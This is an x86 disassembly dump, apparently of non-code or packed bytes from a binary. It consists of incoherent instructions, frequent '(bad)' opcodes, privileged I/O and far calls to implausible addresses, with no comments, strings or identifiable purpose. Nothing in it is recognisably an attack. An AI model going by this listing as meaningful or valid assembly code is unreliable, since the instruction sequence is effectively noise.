  408ede:	add    BYTE PTR [ebp-0x16276],cl
  408ee4:	jo     0x408eb8
  408ee6:	inc    ecx
  408ee7:	sub    al,0xc7
  408ee9:	xor    eax,0x5da64fca
  408eee:	call   0x97f89c
  408ef3:	or     edx,DWORD PTR [edi]
  408ef5:	sub    al,BYTE PTR [ecx+ebp*8]
  408ef8:	mov    edx,DWORD PTR [edi+0x0]
  408efb:	add    BYTE PTR [edi-0x18beb82d],ch
  408f01:	sahf   
  408f02:	jne    0x408f10
  408f04:	aas    
  408f05:	in     eax,0xcd
  408f07:	push   DWORD PTR [eax]
  408f09:	rcl    BYTE PTR [edx+eax*8-0x72005fbf],cl
  408f10:	aad    0x71
  408f12:	push   edx
  408f13:	push   eax
  408f14:	aas    
  408f15:	mov    eax,ds:0xd90ffce
  408f1a:	(bad)  
  408f1b:	jne    0x408eb4
  408f1d:	or     eax,0xb58f75fe
  408f22:	adc    bh,bh
  408f24:	jo     0x408ec4
  408f26:	call   0x409024
	...
  408f4f:	add    BYTE PTR [eax],al
  408f51:	add    ch,bl
  408f53:	sahf   
  408f54:	(bad)  
  408f55:	jmp    0x408f5b
  408f57:	rol    BYTE PTR [ecx+0x2c],cl
  408f5a:	out    dx,al
  408f5b:	fdiv   DWORD PTR [ebx+0x689eb0fe]
  408f61:	fadd   QWORD PTR [esi+0x1e]
  408f64:	(bad)  
  408f65:	(bad)  
  408f66:	cli    
  408f67:	jmp    0xb5f18f69
  408f6c:	push   edx
  408f6d:	mov    bh,0x3e
  408f6f:	xor    al,0x3
  408f71:	or     edi,DWORD PTR [esi+0x47]
  408f74:	(bad)  
  408f75:	les    ebp,FWORD PTR [bp+si-0x3d]
  408f79:	push   DWORD PTR [eax]
  408f7b:	sub    BYTE PTR [edi],cl
  408f7d:	call   0xffbc881c
  408f82:	and    DWORD PTR [eax-0x49],ebp
  408f85:	(bad)  
  408f86:	sbb    DWORD PTR [edx+0x70cae7d3],edi
  408f8c:	jl     0x408f8d
  408f8e:	outs   dx,BYTE PTR ds:[esi]
  408f8f:	loop   0x409010
  408f91:	jge    0x408fc1
  408f93:	xor    dh,bh
  408f95:	or     al,0x66
  408f97:	fst    st(1)
  408f99:	inc    eax
  408f9a:	ds ret 0x226a
  408f9e:	mov    cl,0x32
  408fa0:	add    ebp,ebx
  408fa2:	cmp    ebp,DWORD PTR [edx+0x323e0002]
  408fa8:	(bad)  [edx]
  408faa:	inc    dh
  408fac:	or     DWORD PTR [edx-0x37],edx
  408faf:	mov    edi,0x50a8e80a
  408fb4:	jl     0x408fb5
	...
  408fde:	add    BYTE PTR [eax],al
  408fe0:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  408fe1:	jle    0x40902c
  408fe3:	push   DWORD PTR [ecx-0x573d7951]
  408fe9:	sub    DWORD PTR [ebx+0x50],edi
  408fec:	mov    eax,ds:0x99febf67
  408ff1:	cmp    DWORD PTR [eax+eax*1-0x38],ebp
  408ff5:	xor    al,BYTE PTR [ebx]
  408ff7:	test   DWORD PTR [esi+0x39],edi
  408ffa:	adc    BYTE PTR [eax],0x81
  408ffd:	adc    DWORD PTR [ebx-0x1],edi
  409000:	mov    bl,0xd6
  409002:	jns    0x409003
  409004:	jno    0x409010
  409006:	ja     0x408fbd
  409008:	xor    bh,BYTE PTR ds:[edx-0x4b]
  40900c:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40900d:	lock jp 0x40900f
  409010:	pop    bx
  409012:	or     eax,0xb020514e
  409017:	inc    esi
  409018:	cmp    bl,BYTE PTR [ebx+0x3c]
  40901b:	(bad)  
  40901c:	push   edx
  40901d:	fsub   QWORD PTR [eax+edi*2+0x4859601]
  409024:	ds pop ebx
  409026:	jmp    0x819043a5
  40902b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40902c:	lock pop ds
  40902e:	outs   dx,BYTE PTR ds:[esi]
  40902f:	paddd  mm4,QWORD PTR [esi+0x1f7b8d03]
  409036:	pop    esi
  409037:	icebp  
  409038:	cmp    DWORD PTR [eax],esp
  40903a:	fdiv   QWORD PTR [edi+0x16]
  40903d:	add    ebx,DWORD PTR [ebx+edi*2]
  409040:	stc    
  409041:	mov    al,BYTE PTR [esi-0xf]
	...
  40906c:	add    BYTE PTR [eax],al
  40906e:	cmc    
  40906f:	xor    bh,cl
  409071:	dec    ebp
  409072:	jmp    0xe601f696
  409077:	mov    ah,0xe8
  409079:	jp     0x4090ce
  40907b:	pop    ds
  40907c:	es icebp 
  40907e:	cmp    DWORD PTR [ebx],esi
  409080:	aad    0x79
  409082:	leave  
  409083:	pop    ds
  409084:	push   ss
  409085:	icebp  
  409086:	lds    esi,FWORD PTR [edx]
  409088:	icebp  
  409089:	dec    ebp
  40908a:	mov    ecx,0x4246301f
  40908f:	pop    ebx
  409090:	xchg   esp,eax
  409091:	mov    ds,WORD PTR [edx-0x5f8bd327]
  409097:	pop    ds
  409098:	out    dx,al
  409099:	in     eax,dx
  40909a:	cdq    
  40909b:	mov    cl,0xea
  40909d:	jp     0x4090aa
  40909f:	push   ebx
  4090a0:	shl    DWORD PTR [edx],1
  4090a2:	sbb    DWORD PTR [edi],0x1efb8cd6
  4090a8:	inc    ecx
  4090a9:	add    BYTE PTR [edi],bh
  4090ab:	pop    ebx
  4090ac:	jmp    0xbf684c39
  4090b1:	jp     0x40911c
  4090b3:	mov    al,BYTE PTR [eax]
  4090b5:	shl    DWORD PTR [esi+0x48e8ffe5],0x1b
  4090bc:	(bad)  
  4090be:	cwde   
  4090bf:	pop    edx
  4090c0:	add    cl,ch
  4090c2:	push   es
  4090c3:	push   edi
  4090c4:	add    ecx,ebp
  4090c6:	cmp    eax,0x3d718750
  4090cb:	pop    ebx
  4090cc:	add    BYTE PTR [ecx],dl
  4090ce:	mov    DWORD PTR [ecx+eax*2+0xe9],ecx
	...
  4090f9:	add    BYTE PTR [eax],al
  4090fb:	add    BYTE PTR [esi-0x5b880928],dh
  409101:	push   ds
  409102:	push   eax
  409103:	sbb    DWORD PTR [edi],0xc266ff10
  409109:	fsubr  st,st(7)
  40910b:	pop    edi
  40910c:	test   BYTE PTR [esi],bl
  40910e:	call   FWORD PTR [ebp+ecx*4-0x1ab100e3]
  409115:	pop    edx
  409116:	add    ecx,ebp
  409118:	cmp    eax,0x673684d0
  40911d:	push   ds
  40911e:	call   FWORD PTR [ecx-0x57b82d2b]
  409124:	cmp    eax,0xfab8e8b3
  409129:	push   ds
  40912a:	addr16 or dl,dh
  40912d:	fwait
  40912e:	add    BYTE PTR [ecx],al
  409130:	clc    
  409131:	out    0xff,eax
  409133:	call   0xd8b4ac80
  409138:	mov    ds:0x2c648c1e,eax
  40913d:	sbb    eax,0x1d8cf6ff
  409142:	jne    0x409125
  409144:	and    eax,0x17e6fcc1
  409149:	push   ds
  40914a:	mov    ch,0xd9
  40914c:	add    al,0x1e
  40914e:	inc    DWORD PTR [ecx+0x3e]
  409151:	pop    esp
  409152:	add    cl,ch
  409154:	rcr    al,0xf6
  409157:	add    BYTE PTR [ecx-0x5c],bh
  40915a:	call   DWORD PTR [eax+0xf]
  40915d:	rol    DWORD PTR [edi+0x41],cl
	...
  409188:	add    BYTE PTR [eax],al
  40918a:	push   edi
  40918b:	xor    ch,bl
  40918d:	push   ecx
  40918e:	es push edi
  409190:	push   0xff1a16e1
  409195:	out    0x4f,eax
  409197:	in     eax,dx
  409198:	(bad)  
  409199:	call   FWORD PTR [edx+ebx*4+0x74]
  40919d:	adc    DWORD PTR ds:0xb0858d57,edi
  4091a3:	mov    eax,ds:0xa447ffff
  4091a8:	jne    0x4091b2
  4091aa:	mov    edi,0xa8fffc03
  4091af:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091b0:	mov    ch,0xf0
  4091b2:	cdq    
  4091b3:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091b4:	(bad)  
  4091b5:	call   0x402291
  4091ba:	std    
  4091bb:	outs   dx,BYTE PTR ds:[esi]
  4091bc:	call   0xffe4ec52
  4091c1:	or     esp,DWORD PTR [edi]
  4091c3:	sub    ebx,DWORD PTR [ebx]
  4091c5:	push   0x400a15
  4091ca:	(bad)  
  4091cb:	mov    cl,0x1d
  4091cd:	int    0x28
  4091cf:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4091d0:	push   eax
  4091d1:	push   0xffffffe7
  4091d3:	or     esi,edi
  4091d5:	jne    0x4091a6
  4091d7:	mov    cl,0x32
  4091d9:	std    
  4091da:	sub    BYTE PTR [eax+ebp*8-0x5ba1e7],ah
  4091e1:	push   0x400a76
  4091e6:	int    0x3f
  4091e8:	push   DWORD PTR [ebp-0x61]
  4091eb:	mov    cl,0xaa
  4091ed:	inc    BYTE PTR [eax]
	...
  409217:	add    BYTE PTR [eax+0x56b168a2],ch
  40921d:	sbb    bh,bh
  40921f:	imul   esi,DWORD PTR [esp+eiz*4],0x1c3e0875
  409226:	pushf  
  409227:	(bad)  
  409228:	jns    0x409236
  40922a:	jmp    0x4091dc
  40922c:	(bad)  
  40922e:	add    al,0x6a
  409230:	dec    edx
  409231:	fucomp st(5)
  409233:	pop    es
  409234:	push   esi
  409235:	mov    bh,0x79
  409237:	call   FWORD PTR [ecx-0x14]
  40923a:	in     eax,dx
  40923b:	sti    
  40923c:	push   ecx
  40923d:	ds or  al,0xe8
  409240:	jmp    0x78400a3a
  409245:	icebp  
  409246:	(bad)  
  409247:	call   DWORD PTR [edx+0x3e6867b9]
  40924d:	xor    ch,BYTE PTR [eax-0x42]
  409250:	sub    DWORD PTR [eax],ebp
  409252:	pop    es
  409253:	jmp    FWORD PTR [ebx+0x28d76b3a]
  409259:	scas   al,BYTE PTR es:[edi]
  40925a:	js     0x409225
  40925c:	cld    
  40925d:	sub    al,BYTE PTR [ebx]
  40925f:	push   ebp
  409260:	mov    ch,0x8e
  409262:	test   ah,al
  409264:	push   es
  409265:	outs   dx,BYTE PTR ds:[esi]
  409266:	mov    esi,0x3323efb
  40926b:	add    bl,al
  40926d:	out    dx,eax
  40926e:	jbe    0x4092c0
  409270:	push   esi
  409271:	cdq    
  409272:	rol    BYTE PTR [eax+0x3e],cl
  409275:	gs out dx,al
  409277:	or     ebx,ecx
  409279:	daa    
  40927a:	test   eax,0x48
	...
  4092a3:	add    BYTE PTR [eax],al
  4092a5:	add    BYTE PTR [edi+0x32],bh
  4092a8:	imul   edi,DWORD PTR [edx+0xb783df5],0xfffffffe
  4092af:	mov    esi,0x4a038918
  4092b4:	jmp    0x4092b6
  4092b6:	ds inc ebp
  4092b8:	mov    ecx,0x771e33ff
  4092bd:	jne    0x409265
  4092bf:	and    eax,0xf2a607ed
  4092c4:	push   0xe65b91ff
  4092c9:	icebp  
  4092ca:	xchg   ecx,eax
  4092cb:	xor    ebp,DWORD PTR [ecx+0x4c]
  4092ce:	sbb    DWORD PTR [eax+eiz*4],0x345b4642
  4092d5:	mov    esp,DWORD PTR [edx-0x26]
  4092d8:	lods   al,BYTE PTR ds:[esi]
  4092d9:	mov    al,0x68
  4092db:	sbb    al,0xbe
  4092dd:	aas    
  4092de:	mov    ebx,0x5977b6e3
  4092e3:	pop    ebx
  4092e4:	jmp    0x2c10d0ec
  4092e9:	or     BYTE PTR ds:0xbe01151b,dh
  4092ef:	arpl   cx,bp
  4092f1:	lock inc edx
  4092f3:	xor    ah,ch
  4092f5:	add    al,0x3e
  4092f7:	pop    ebx
  4092f8:	xchg   cl,dh
  4092fa:	cmp    DWORD PTR [esp+esi*8],ebx
  4092fd:	pop    es
  4092fe:	push   ss
  4092ff:	das    
  409300:	mov    ds:0x198b1977,al
  409305:	ja     0x409292
  409307:	push   ebx
  409308:	push   ecx
  409309:	fiadd  WORD PTR [eax]
	...
  409333:	add    BYTE PTR [eax],cl
  409335:	sbb    al,0x5e
  409337:	ins    BYTE PTR es:[edi],dx
  409338:	inc    eax
  409339:	adc    edx,DWORD PTR [esi+0x77]
  40933c:	or     ax,0xc49e
  409340:	icebp  
  409341:	sbb    al,0xbc
  409343:	pop    es
  409344:	(bad)  
  409345:	or     dh,BYTE PTR [edx]
  409347:	ja     0x40932a
  409349:	shr    DWORD PTR [ebx-0x44],1
  40934c:	fcomp  DWORD PTR [ebx]
  40934e:	cs in  al,dx
  409350:	adc    ebx,DWORD PTR [edx-0x17]
  409353:	add    edi,DWORD PTR [ebx-0x3e89d52b]
  409359:	sbb    edi,DWORD PTR [ecx+0xe13066b]
  40935f:	ja     0x409324
  409361:	aad    0x2a
  409363:	jbe    0x40930e
  409365:	sbb    ebx,DWORD PTR [ecx-0x1d148a]
  40936b:	not    BYTE PTR [eax]
  40936d:	sbb    al,0xe8
  40936f:	jae    0x40933d
  409371:	pop    edx
  409372:	add    BYTE PTR [eax-0x42],dh
  409375:	fdivp  st(5),st
  409377:	fimul  WORD PTR [eax]
  409379:	fwait
  40937a:	(bad)  
  40937c:	fcomp  DWORD PTR [edx+0x0]
  40937f:	jmp    0xc802594a
  409384:	lock sbb esi,edi
  409387:	jmp    0x4093d6
  409389:	pop    ebx
  40938a:	add    cl,ch
  40938c:	imul   esp,DWORD PTR [edi+0x1cff548d],0x98b6a6ff
  409396:	sub    al,0x39
	...
  4093c0:	add    BYTE PTR [eax],al
  4093c2:	push   edx
  4093c3:	adc    cl,BYTE PTR [edi+0x28]
  4093c6:	inc    edx
  4093c7:	add    edx,DWORD PTR [ecx+0x5a]
  4093ca:	cmp    eax,0x2ea90b5b
  4093cf:	pop    ebp
  4093d0:	jmp    0x4093f5
  4093d2:	mov    bh,0xf0
  4093d4:	shl    DWORD PTR [edi-0x70],0x1a
  4093d8:	lea    ebp,[ebx]
  4093da:	stos   WORD PTR es:[edi],ax
  4093dc:	push   0x9c0032
  4093e1:	push   ecx
  4093e2:	push   eax
  4093e3:	into   
  4093e4:	(bad)  
  4093e5:	call   0xebb5af2e
  4093ea:	fs fwait
  4093ec:	lea    ebx,[edi+edi*2+0x19]
  4093f0:	(bad)  
  4093f1:	ds mov dh,0x9d
  4093f4:	sub    al,0x60
  4093f6:	mov    esi,0x482efdcf
  4093fb:	or     DWORD PTR [edx-0x1e4fd4f],0xffffff94
  409402:	cmp    DWORD PTR [ebx],eax
  409404:	cmp    al,0x22
  409406:	xor    BYTE PTR [edx],bl
  409408:	call   DWORD PTR [ecx+eiz*8+0x19]
  40940c:	inc    DWORD PTR [eax]
  40940e:	inc    eax
  40940f:	cs out 0x84,eax
  409412:	ins    BYTE PTR es:[edi],dx
  409413:	xchg   ecx,eax
  409414:	(bad)  
  409415:	call   FWORD PTR [edx]
  409417:	outs   dx,BYTE PTR ds:[esi]
  409418:	push   eax
  409419:	call   0x40392a
  40941e:	inc    edi
  40941f:	das    
  409420:	(bad)  
  409421:	jne    0x4093b2
  409423:	xchg   BYTE PTR [ecx+0xfe],ah
	...
  40944d:	add    BYTE PTR [eax],al
  40944f:	add    BYTE PTR [eax-0x67861770],dl
  409455:	nop
  409456:	dec    DWORD PTR [ebp-0x16326]
  40945c:	mov    al,ds:0xd3b5fe2f
  409461:	nop
  409462:	(bad)  
  409463:	(bad)  
  409464:	jg     0x409420
  409466:	mov    dl,0x0
  409468:	push   edi
  409469:	cdq    
  40946a:	ror    BYTE PTR [edi],0xda
  40946d:	cli    
  40946e:	std    
  40946f:	call   eax
  409471:	(bad)  
  409472:	mov    ch,0xbc
  409474:	ror    DWORD PTR [edi-0x33201701],0xff
  40947b:	jmp    DWORD PTR [eax-0x6f014836]
  409481:	nop
  409482:	call   0xffd06cd0
  409487:	leave  
  409488:	push   ebp
  409489:	arpl   WORD PTR [eax],ax
  40948b:	push   ebp
  40948c:	mov    WORD PTR [ebx-0x6f6c3b7d],es
  409492:	jne    0x4094a0
  409494:	jg     0x409476
  409496:	retf   0x80ff
  409499:	out    0x44,al
  40949b:	cld    
  40949c:	in     al,dx
  40949d:	popf   
  40949e:	je     0x40f407
  4094a4:	dec    DWORD PTR [ebx+edx*2+0x41]
  4094a8:	xlat   BYTE PTR ds:[ebx]
  4094a9:	mov    ?,WORD PTR [ebp-0x4]
  4094ac:	das    
  4094ad:	ror    ecx,1
  4094af:	(bad)  
  4094b0:	ds jno 0x409487
  4094b3:	add    BYTE PTR [bx+si],al
	...
  4094de:	mov    esp,0xf9ffc1d4
  4094e3:	pusha  
  4094e4:	out    dx,eax
  4094e5:	pop    es
  4094e6:	xchg   esi,eax
  4094e7:	scas   eax,DWORD PTR es:[edi]
  4094e8:	jbe    0x4094e9
  4094ea:	cdq    
  4094eb:	pop    ebx
  4094ec:	or     edi,eax
  4094ee:	xchg   ecx,eax
  4094ef:	or     bl,ch
  4094f1:	inc    ebp
  4094f2:	in     eax,dx
  4094f3:	inc    edx
  4094f4:	add    al,0xff
  4094f6:	or     edi,DWORD PTR [eax]
  4094f8:	imul   ebx,DWORD PTR [ebp+0x50743084],0xffffffe6
  4094ff:	test   eax,edx
  409501:	inc    eax
  409502:	ds je  0x40957a
  409505:	jne    0x40953d
  409507:	sub    al,0xf0
  409509:	std    
  40950a:	pop    ecx
  40950b:	shr    BYTE PTR [edx-0x16],1
  40950e:	js     0x4094d8
  409510:	jae    0x40957a
  409512:	jmp    0x4140586b
  409517:	outs   dx,BYTE PTR ds:[esi]
  409518:	js     0x409502
  40951a:	mov    edx,0x8eff73bc
  40951f:	pop    edx
  409520:	adc    BYTE PTR [ebx+0x7f],0x2
  409524:	sar    esi,cl
  409526:	stos   DWORD PTR es:[edi],eax
  409527:	or     ch,BYTE PTR [ebx+0x52]
  40952a:	sbb    BYTE PTR [edx-0x3ef8178c],dl
  409530:	jae    0x409531
  409532:	xchg   esi,eax
  409533:	sti    
  409534:	iret   
  409535:	inc    eax
  409536:	ds mov ecx,0xcde6fbee
  40953c:	dec    eax
  40953d:	push   ecx
  40953f:	shr    dl,cl
  409541:	add    DWORD PTR [eax],0x0
	...
  40956b:	add    BYTE PTR [ebp-0x1eaffd3d],cl
  409571:	iret   
  409572:	or     ch,al
  409574:	(bad)  
  409576:	je     0x409577
  409578:	out    0xda,al
  40957a:	cmp    al,0xff
  40957c:	leave  
  40957d:	pop    ebx
  40957e:	es out dx,al
  409580:	lds    eax,FWORD PTR [ebx]
  409582:	dec    ecx
  409583:	cmp    eax,0x412018b9
  409588:	inc    esi
  409589:	pop    ebx
  40958a:	mov    ah,0x88
  40958c:	call   0xe985:0x9772cdc
  409593:	jmp    0xbbcadd5
  409598:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409599:	sbb    ch,BYTE PTR [edx]
  40959b:	je     0x409526
  40959d:	loop   0x4095ca
  40959f:	jo     0x409556
  4095a1:	push   esi
  4095a2:	sbb    edi,DWORD PTR [esi+edi*8+0x3e33695a]
  4095a9:	(bad)  
  4095aa:	adc    bl,ah
  4095ac:	ins    BYTE PTR es:[edi],dx
  4095ad:	stos   BYTE PTR es:[edi],al
  4095ae:	sub    BYTE PTR [ecx+ecx*1],al
  4095b1:	add    eax,ebp
  4095b3:	mov    dh,0x3e
  4095b5:	pop    ebx
  4095b6:	loop   0x4095fb
  4095b8:	retf   0x1678
  4095bb:	pop    esp
  4095bc:	push   es
  4095bd:	sub    esp,DWORD PTR [esi+0x151b3573]
  4095c3:	sbb    BYTE PTR [esi+0x7ed76b83],cl
  4095c9:	pop    ebx
  4095ca:	cmp    DWORD PTR [ebx-0x4d],esi
  4095cd:	arpl   WORD PTR [ecx+0x5b],dx
	...
  4095f7:	add    BYTE PTR [eax],al
  4095f9:	add    BYTE PTR [ebx],ah
  4095fb:	sbb    BYTE PTR [esi+0x5c],bh
  4095fe:	mov    BYTE PTR [ecx],ah
  409600:	jbe    0x409675
  409602:	adc    cl,BYTE PTR [ecx+ebp*4-0x53]
  409606:	or     DWORD PTR [eax],ebx
  409608:	data16 jae 0x409617
  40960b:	leave  
  40960c:	and    BYTE PTR [ebx],cl
  40960e:	jae    0x40962e
  409610:	ret    
  409611:	or     eax,0x5be18df1
  409616:	out    dx,eax
  409617:	sbb    BYTE PTR [esi+0x73],al
  40961a:	push   esp
  40961b:	cmp    al,0x3e
  40961d:	stc    
  40961e:	inc    ecx
  40961f:	add    eax,DWORD PTR [eax]
  409621:	dec    esi
  409622:	dec    esp
  409623:	sbb    bh,bh
  409625:	ret    
  409626:	cmp    DWORD PTR [eax],ebx
  409628:	jne    0x40961b
  40962a:	gs ss (bad) 
  40962d:	push   ds
  40962e:	sub    eax,0xb7162685
  409633:	pop    edi
  409634:	call   0xff58c273
  409639:	xchg   ecx,eax
  40963a:	lods   eax,DWORD PTR ss:[esi]
  40963c:	inc    ecx
  40963d:	jmp    0x149244e
  409642:	xchg   DWORD PTR [esi],edx
  409644:	(bad)  
  409645:	out    dx,al
  409646:	gs dec esp
  409648:	push   edx
  409649:	sub    BYTE PTR [edx],bh
  40964b:	sbb    BYTE PTR [ebp-0xf],dh
  40964e:	adc    eax,0xecd6fd53
  409653:	sub    BYTE PTR [ecx+0x3b],0x83
  409657:	pop    ss
  409658:	(bad)  
  409659:	cmp    al,0x62
  40965b:	jmp    FWORD PTR [edx]
  40965d:	mov    esp,0x0
	...
  409686:	add    BYTE PTR [eax],al
  409688:	int3   
  409689:	pop    ss
  40968a:	push   0x9a6b5e
  40968f:	scas   al,BYTE PTR es:[edi]
  409690:	inc    esi
  409691:	pop    edi
  409692:	call   0xff58659e
  409697:	adc    DWORD PTR [edi-0x57],edi
  40969a:	inc    ecx
  40969b:	jmp    0x8149274c
  4096a0:	push   edx
  4096a1:	sbb    bh,bh
  4096a3:	xchg   BYTE PTR ds:0x42285212,al
  4096a9:	push   ss
  4096aa:	jne    0x40968d
  4096ac:	jne    0x40970d
  4096ae:	std    
  4096af:	outs   dx,BYTE PTR ds:[esi]
  4096b0:	mov    WORD PTR [esi],ss
  4096b2:	jne    0x409719
  4096b4:	mov    WORD PTR [eax+0x1a2e5108],ss
  4096ba:	call   DWORD PTR [esi+0xc]
  4096bd:	and    al,0xc2
  4096bf:	in     eax,0x3d
  4096c1:	mov    al,0x8b
  4096c3:	add    BYTE PTR [ebx-0x18f38323],cl
  4096c9:	push   cs
  4096ca:	adc    eax,0xff6a92ff
  4096cf:	jne    0x4096bc
  4096d1:	mov    DWORD PTR [ebp+0x8],esi
  4096d4:	das    
  4096d5:	retf   0xffea
  4096d8:	pop    eax
  4096d9:	mov    DWORD PTR [ebp+0xc],esi
  4096dc:	aas    
  4096dd:	in     eax,0xc4
  4096df:	(bad)  
  4096e0:	cmp    BYTE PTR [edi-0x3e],dl
  4096e3:	or     al,0x97
  4096e5:	xor    ecx,DWORD PTR [edx-0x361db14]
  4096eb:	push   0x0
	...
  409715:	add    BYTE PTR [edi-0x67eb8a77],ah
  40971b:	push   cs
  40971c:	ud0    esp,edx
  40971f:	pop    edx
  409720:	call   0xffcd46be
  409725:	or     esp,DWORD PTR [edi+0x22895b13]
  40972b:	mov    ebp,DWORD PTR [eax-0xd]
  40972e:	inc    esp
  40972f:	sbb    bh,bh
  409731:	(bad)  
  409732:	adc    cl,BYTE PTR [ebx-0x7361f318]
  409738:	jmp    FWORD PTR [eax+0x57]
  40973b:	pop    edx
  40973c:	out    dx,eax
  40973d:	mov    esi,0x8758c07
  409742:	iret   
  409743:	mov    ebp,0x36c8fffe
  409748:	std    
  409749:	push   ebx
  40974a:	push   esi
  40974b:	pop    edi
  40974c:	push   DWORD PTR [ebp-0x45]
  40974f:	mov    dh,0xf1
  409751:	enter  0x8c98,0x68
  409755:	add    DWORD PTR [edi],esp
  409757:	jnp    0x409717
  409759:	push   eax
  40975a:	cwde   
  40975b:	push   cs
  40975c:	pop    es
  40975d:	call   0x4023ef
  409762:	movups XMMWORD PTR [ebx+0x41],xmm2
  409766:	ds add al,0x70
  409769:	jne    0x409755
  40976b:	fwait
  40976c:	pop    edx
  40976d:	enter  0x9ce1,0xdc
  409771:	add    DWORD PTR [esi],edi
  409773:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  409774:	mov    dl,0x50
  409776:	rcl    esi,1
  409778:	cli    
  409779:	out    0x0,eax
	...
  4097a3:	add    BYTE PTR [ecx+0x45],bl
  4097a6:	jno    0x4097a7
  4097a8:	shl    esi,0x6e
  4097ab:	call   0xffb1d70f
  4097b0:	xchg   DWORD PTR [ecx+0x14],eax
  4097b3:	add    BYTE PTR [ebx],dl
  4097b5:	jns    0x409817
  4097b7:	push   0xffc1f848
  4097bc:	cwde   
  4097bd:	mov    ?,edi
  4097bf:	out    0xe2,eax
  4097c1:	cmp    esi,DWORD PTR [ecx-0x1]
  4097c4:	mov    DWORD PTR [esi+0x34965013],ecx
  4097ca:	cmp    edi,edi
  4097cc:	jns    0x409802
  4097ce:	not    BYTE PTR [ebx]
  4097d0:	push   cs
  4097d1:	sub    eax,0x655607f6
  4097d6:	jno    0x4097d7
  4097d8:	popa   
  4097d9:	stos   DWORD PTR es:[edi],eax
  4097da:	es push esp
  4097dc:	inc    DWORD PTR [ebx]
  4097de:	jo     0x409855
  4097e0:	inc    edx
  4097e1:	sbb    al,0x7d
  4097e3:	enter  0xc449,0x6f
  4097e7:	jne    0x409817
  4097e9:	push   esp
  4097ea:	pop    esp
  4097eb:	aad    0x6
  4097ed:	imul   BYTE PTR [edi-0x1]
  4097f0:	stos   DWORD PTR es:[edi],eax
  4097f1:	push   ss
  4097f2:	sar    esi,cl
  4097f4:	mov    bl,0xfa
  4097f6:	pop    edx
  4097f7:	sbb    al,0x21
  4097f9:	fisubr WORD PTR [edi-0x37]
  4097fc:	cld    
  4097fd:	xor    al,BYTE PTR [ebx]
  4097ff:	push   ebp
  409800:	(bad)
  409803:	les    ecx,FWORD PTR [edx]
  409805:	xchg   dh,dh
  409807:	or     eax,DWORD PTR [eax]
	...
  409831:	add    BYTE PTR [esi],dl
  409833:	pop    esp
  409834:	add    eax,0xf214f93b
  409839:	inc    ebx
  40983a:	push   0xffffffa1
  40983c:	pusha  
  40983d:	(bad)  
  40983e:	in     eax,0x83
  409840:	jmp    0xd1166948
  409845:	je     0x4098b4
  409847:	call   0xf636:0x174b70e9
  40984e:	inc    ecx
  40984f:	add    esp,DWORD PTR [edx+0x70]
  409852:	rcl    DWORD PTR [ecx+edx*4],0x2
  409856:	ds add al,0x5f
  409859:	(bad)  [ebx-0x56fc5758]
  40985f:	mov    cs,WORD PTR ds:0x11632b70
  409865:	stc    
  409866:	cwde   
  409867:	adc    al,0xfe
  409869:	fidivr DWORD PTR [edi]
  40986b:	pop    ebx
  40986c:	push   es
  40986d:	mov    cl,0x16
  40986f:	bound  edx,QWORD PTR [ebp+0x5c1581c2]
  409875:	jo     0x4098f0
  409877:	mov    ?,ecx
  409879:	pop    ebx
  40987a:	fist   WORD PTR [ebx]
  40987c:	(bad)  
  40987d:	outs   dx,DWORD PTR ds:[esi]
  40987e:	imul   ecx,DWORD PTR [esi+0x1ee85ccd],0x19876fc6
  409888:	icebp  
  409889:	add    ebp,ebx
  40988b:	ffreep st(4)
  40988d:	add    DWORD PTR [edx-0x2bfbbce9],0x5d
  409894:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  409895:	stc    
	...
  4098be:	add    BYTE PTR [eax],al
  4098c0:	inc    ecx
  4098c1:	add    eax,DWORD PTR [ecx+0x60143145]
  4098c7:	leave  
  4098c8:	and    eax,0x7ed3a583
  4098cd:	pop    ebx
  4098ce:	adc    DWORD PTR [edx+0x6d],edi
  4098d1:	call   0x20ff:0xc54b6ee9
  4098d8:	add    edx,DWORD PTR [esi+edi*8]
  4098db:	hlt    
  4098dc:	add    eax,0x6967adfc
  4098e1:	adc    al,0x68
  4098e3:	aaa    
  4098e4:	or     eax,0xbbc1009b
  4098e9:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4098ea:	inc    ecx
  4098eb:	jmp    0xb1eee740
  4098f0:	add    dl,BYTE PTR [esi+edi*8]
  4098f3:	mov    ah,0xd5
  4098f5:	sti    
  4098f6:	xchg   ebp,eax
  4098f7:	aaa    
  4098f8:	pop    ecx
  4098f9:	adc    al,0x68
  4098fb:	adc    ch,ch
  4098fd:	call   0xe941:0xa8379100
  409904:	and    BYTE PTR [esi-0x52],cl
  409907:	mov    eax,ds:0x94fe1382
  40990c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40990d:	sti    
  40990e:	jge    0x409917
  409910:	sub    DWORD PTR [eax+ebp*2],edx
  409913:	adc    DWORD PTR [ebp-0x66],ebp
  409916:	add    BYTE PTR [ecx-0x16be57f9],al
  40991c:	adc    BYTE PTR [esi-0x52],cl
  40991f:	xor    DWORD PTR [ebx+0x54fe13],eax
	...
  40994d:	add    BYTE PTR [edx-0x5],dh
  409950:	xlat   BYTE PTR gs:[ebx]
  409952:	fcom   DWORD PTR [ebx]
  409954:	push   0x9a8ca5
  409959:	push   ecx
  40995a:	xchg   edx,eax
  40995b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40995c:	inc    ecx
  40995d:	jmp    0x21eee742
  409962:	adc    DWORD PTR [ebx],0xfffffffe
  409965:	xor    al,0x42
  409967:	sti    
  409968:	dec    ebp
  409969:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40996a:	test   al,0x12
  40996c:	push   0x9c0cb7
  409971:	add    edx,esi
  409973:	scas   al,BYTE PTR es:[edi]
  409974:	inc    ecx
  409975:	jmp    0xeee20a
  40997a:	dec    edi
  40997b:	sbb    bh,bh
  40997d:	dec    BYTE PTR [edx]
  40997f:	pop    ss
  409980:	out    0x36,eax
  409982:	xchg   ecx,eax
  409983:	cmp    edi,0x402dac68
  409989:	add    BYTE PTR [edi],cl
  40998b:	iret   
  40998c:	push   edx
  40998d:	inc    ecx
  40998e:	out    0x81,eax
